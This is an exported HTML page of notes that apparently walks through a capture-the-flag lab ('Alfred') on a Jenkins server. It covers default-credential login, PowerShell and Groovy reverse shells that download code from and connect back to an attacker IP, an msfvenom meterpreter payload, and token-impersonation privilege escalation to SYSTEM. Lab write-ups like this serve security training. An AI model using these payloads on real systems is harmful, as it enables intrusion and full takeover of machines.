<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>alfred</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>alfred</h1><br/><p><strong>Alfred</strong></p><p></p><p>nmap -Pn -sV -sC -O -vv 10.10.3.206</p><p></p><p>Scanning 10.10.3.206 [1000 ports]</p><p>Discovered open port 8080/tcp on 10.10.3.206</p><p>Discovered open port 80/tcp on 10.10.3.206</p><p>Discovered open port 3389/tcp on 10.10.3.206</p><p></p><p></p><p>we browse to http://10.10.3.206:8080</p><p></p><p>Login using default credentials for jenkins ----  <strong>admin:admin</strong></p><p></p><p><strong>Foothold</strong></p><p><strong>Way-1</strong></p><p></p><p>THM Reference</p><p></p><p>Go to Build History.</p><p>http://10.10.3.206:8080/view/all/builds</p><p></p><p>Click on Project 1</p><p>http://10.10.3.206:8080/job/project/</p><p></p><p>On the left click on configure</p><p>http://10.10.3.206:8080/job/project/configure</p><p></p><p></p><p><img src="images/6-1.png" alt="images/6-1.png" /></p><p></p><p>Powershell Payload for reverse shell using Nishang.</p><p>https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</p><p></p><p><em><strong>cd /opt</strong></em></p><p><em><strong>git clone https://github.com/samratashok/nishang.git</strong></em></p><p><em><strong>cd /opt/nishang/Shells</strong></em></p><p><em><strong></strong></em></p><p></p><p>Note: We have to host the <em><strong>Invoke-PowerShellTcp.ps1</strong></em> file with <em><strong>python2 -m SimpleHTTPServer 80</strong></em></p><p></p><p><em><strong>powershell iex (New-Object  Net.WebClient).DownloadString(&#39;http://10.11.72.31:80/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp  -Reverse -IPAddress 10.11.72.31 -Port </strong></em><strong>7777</strong></p><p></p><p>Run listener in our attack system. <em><strong>rlwrap nc -lvnp 7777</strong></em></p><p></p><p><strong>Note:</strong> As we have command execution we can use any reeverse shell. eg upload nc.exe and get netcat reverse shell etc.</p><p></p><p>Enter our powershell payload in command and APPLY then SAVE.</p><p></p><p>Then on the left click on “<strong>Build Now</strong>&quot;</p><p></p><p>We will have the reverse shell in our netcat listener.</p><p></p><p></p><p>Or</p><p></p><p><strong>Foothold</strong></p><p><strong>Way-2</strong></p><p></p><p>Go to Jenkins -→ Manage jenkins -→ Script Consoie</p><p>http://10.10.65.127:8080/script</p><p></p><p>It allows for any groovy language script</p><p></p><p>We will use the following groovy reverse shell and listen with netcat in kali.</p><p></p><p><em><strong>String host=&quot;10.11.72.31&quot;;int port=6666;String cmd=&quot;cmd.exe&quot;;Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</strong></em></p><p></p><p>and</p><p></p><p><em><strong>lwrap nc -lvnp 6666</strong></em></p><p></p><p>Once we hit run. We will get a reverse shell</p><p></p><p></p><p>Get the user flag at <strong>C:\Users\Bruce\Desktop\user.txt</strong></p><p></p><p></p><p><strong>Shell Switch</strong></p><p>Now, we switch to meterpreter shell for easier prevelege escalation.</p><p></p><p>we make a meterpreter payload using msfvenom.</p><p><em><strong>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.72.31 LPORT=8888 -a x86 --encoder x86/shikata_ga_nai -f exe -o jenkins_revshell.exe</strong></em></p><p></p><p>We host this using python webserver.</p><p></p><p>Download using the last Powershell technique or any other.</p><p><em><strong>powershell &quot;(New-Object System.Net.WebClient).Downloadfile(&#39;http://10.11.72.31:8000/jenkins_revshell.exe&#39;,&#39;jenkins_revshell.exe&#39;)&quot;</strong></em></p><p></p><p><strong></strong></p><p><strong>Start Listner in msfconsole:</strong></p><p></p><p><em><strong>use multi/handler</strong></em></p><p><em><strong>SET PAYLOAD windows/meterpreter/reverse_tcp</strong></em></p><p><em><strong>SET LHOST 10.11.72.31</strong></em></p><p><em><strong>SET LPORT 8888</strong></em></p><p><em><strong></strong></em></p><p><strong>To Run the Rev Shell Executible:</strong></p><p><strong></strong></p><p><strong></strong><em><strong>Start-Process &quot;jenkins_revshell.exe&quot;</strong></em></p><p>OR</p><p><em><strong>powershell -c &quot;Start-Process &#39;jenkins_revshell.exe&#39;&quot; </strong></em>   from cmd.exe</p><p></p><p>We should get a session on meterpreter after this.</p><p></p><p></p><p></p><p><strong>Prevelege Escalation Using Token Impersonation:</strong></p><p></p><p>Check privileges with “<em><strong>whoami /priv</strong></em>”</p><p><strong>SeDebugPrivilege, SeImpersonatePrivilege</strong> are the ones that help to escalate the privelege. Both are enabled here.</p><p></p><p><strong>In the meterpreter:</strong></p><p><em><strong>load incognito</strong></em><strong>	</strong>			:		Loads the Incognito extention of meterpreter used for token impersonation</p><p><em><strong>list_tokens -g</strong></em>				:		It will list all available tokens</p><p></p><p><em><strong>impersonate_token BUILTIN\Administrators</strong></em><em>	</em>	:	This will impersonate the Administrator token</p><p></p><p>Verify with <em><strong>getuid</strong></em></p><p></p><p>We are now <em><strong>NT AUTHORITY\SYSTEM</strong></em> as token but we still need a high privelege process.</p><p>ideally migrate to a high privelege process. <em><strong>eg.lsass.exe or services.exe</strong></em></p><p></p><p>use <em><strong>ps</strong></em> command to show all process.</p><p><em><strong>getpid</strong></em> to show our current process ID.</p><p><em><strong>migrate PID</strong></em> to go to a high privelege process</p><p></p><p>Now we have successfully elevated the priveleges.</p><p>The root flag is at <em><strong>C:\Windows\System32\config\root.txt</strong></em></p><p></p><p>Thanks!! </p></div>
</body>
</html>
